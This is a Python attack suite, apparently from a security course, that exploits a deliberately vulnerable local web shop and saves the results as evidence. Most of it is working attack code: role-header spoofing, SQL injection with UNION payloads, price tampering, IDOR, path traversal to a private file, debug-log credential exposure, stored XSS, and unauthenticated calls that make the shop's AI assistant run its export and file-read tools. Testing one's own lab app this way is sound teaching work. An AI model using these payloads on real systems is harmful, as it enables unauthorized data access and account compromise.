"""
Attack suite for Mini Shop vulnerabilities (Pre-fix).
Executes attacks against http://127.0.0.1:8066 and records evidence.
"""

import json
import os
import subprocess
import urllib.error
import urllib.request
from pathlib import Path

BASE_URL = "http://127.0.0.1:8066"
EVIDENCE_DIR = Path("/home/mak/aifirst/ITMOv2/practices/practice_06/evidence/before")
EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)


def http_request(method, path, body=None, headers=None):
    url = f"{BASE_URL}{path}"
    req_headers = {"Content-Type": "application/json"}
    if headers:
        req_headers.update(headers)
    data = json.dumps(body).encode("utf-8") if body is not None else None
    req = urllib.request.Request(url, data=data, headers=req_headers, method=method)
    try:
        with urllib.request.urlopen(req) as resp:
            status = resp.status
            resp_headers = dict(resp.headers)
            resp_body = resp.read().decode("utf-8")
            return status, resp_headers, resp_body
    except urllib.error.HTTPError as exc:
        return exc.code, dict(exc.headers), exc.read().decode("utf-8")


def run_attacks():
    results = {}

    print("=== 1. Login as Alice to get a token ===")
    status, _, body = http_request("POST", "/login", {"username": "alice", "password": "learn-alice"})
    alice_token = json.loads(body)["token"]
    print(f"Alice token: {alice_token}")

    print("\n=== 2. Attack: Spoofing X-Role: staff (T-01) ===")
    # Unauthenticated client sends X-Role: staff
    status, _, body = http_request("GET", "/admin/export", headers={"X-Role": "staff"})
    results["T-01_spoof_xrole"] = {"status": status, "body": json.loads(body)}
    print(f"Status: {status}, Dumped profiles: {len(json.loads(body))}")

    print("\n=== 3. Attack: SQL Injections (T-04) ===")
    # 3a. /profile SQLi
    status, _, body = http_request("GET", "/profile?id=1%20OR%201=1")
    results["T-04_sqli_profile"] = {"status": status, "body": json.loads(body)}
    print(f"SQLi /profile returned {len(json.loads(body))} profiles")

    # 3b. /search SQLi
    status, _, body = http_request("GET", "/search?q=%27%20UNION%20SELECT%20id,owner,product,price%20FROM%20orders--")
    results["T-04_sqli_search"] = {"status": status, "body": json.loads(body)}
    print(f"SQLi /search returned orders via UNION: {body[:100]}...")

    # 3c. /assistant/context SQLi
    status, _, body = http_request("GET", "/assistant/context?order_id=1%20OR%201=1")
    results["T-04_sqli_context"] = {"status": status, "body": json.loads(body)}
    print(f"SQLi /assistant/context prompt created")

    print("\n=== 4. Attack: Parameter Tampering / Price Manipulation (T-03) ===")
    status, _, body = http_request("POST", "/orders", {"product": "chair", "price": 0.01}, headers={"X-Token": alice_token})
    results["T-03_price_tampering"] = {"status": status, "body": json.loads(body)}
    print(f"Order created with manipulated price: {body}")

    print("\n=== 5. Attack: BOLA / IDOR (T-08) ===")
    # Alice accesses Bob's profile
    status, _, body = http_request("GET", "/profile?id=2", headers={"X-Token": alice_token})
    results["T-08_idor_profile"] = {"status": status, "body": json.loads(body)}
    # Unauthenticated dump of all orders
    status, _, body = http_request("GET", "/orders")
    results["T-08_idor_orders"] = {"status": status, "body": json.loads(body)}
    print(f"Dumped all orders without auth: {len(json.loads(body))} orders")

    print("\n=== 6. Attack: Arbitrary File Read / Path Traversal (T-09) ===")
    # Read Bob's receipt
    status, _, body = http_request("GET", "/files?user=bob&path=receipt.txt")
    results["T-09_read_bob_receipt"] = {"status": status, "body": json.loads(body)}
    # Read private operator note
    status, _, body = http_request("GET", "/files?user=alice&path=../../private/operator-note.txt")
    results["T-09_read_operator_note"] = {"status": status, "body": json.loads(body)}
    print(f"Read operator note: {body}")

    print("\n=== 7. Attack: Information Disclosure via /debug/logs (T-07) ===")
    status, _, body = http_request("GET", "/debug/logs")
    logs = json.loads(body)
    results["T-07_debug_logs"] = {"status": status, "count": len(logs), "sample": logs[:3]}
    print(f"Debug logs exposed {len(logs)} log entries containing credentials and tokens")

    print("\n=== 8. Attack: Stored XSS (T-12) ===")
    xss_payload = "<script>alert('XSS-EXPLOITED')</script>"
    status, _, body = http_request("POST", "/reviews", {"product": "chair", "text": xss_payload})
    status_view, _, body_view = http_request("GET", "/reviews/view")
    results["T-12_stored_xss"] = {"status": status_view, "contained": xss_payload in body_view}
    print(f"Stored XSS in /reviews/view: {xss_payload in body_view}")

    print("\n=== 9. Attack: Direct Tool Abuse / Excessive Agency (T-11) ===")
    # 9a. Export profiles directly through assistant
    status, _, body = http_request("POST", "/assistant/execute", {"decision": {"tool": "export_profiles"}})
    results["T-11_direct_export"] = {"status": status, "body": json.loads(body)}
    # 9b. Read private operator note through assistant
    status, _, body = http_request("POST", "/assistant/execute", {"decision": {"tool": "read_file", "arguments": {"path": "private/operator-note.txt"}}})
    results["T-11_direct_read_note"] = {"status": status, "body": json.loads(body)}
    print(f"Direct export_profiles and read_file executed without auth")

    with open(EVIDENCE_DIR / "attacks_summary.json", "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"\nSaved attack results to {EVIDENCE_DIR / 'attacks_summary.json'}")


if __name__ == "__main__":
    run_attacks()
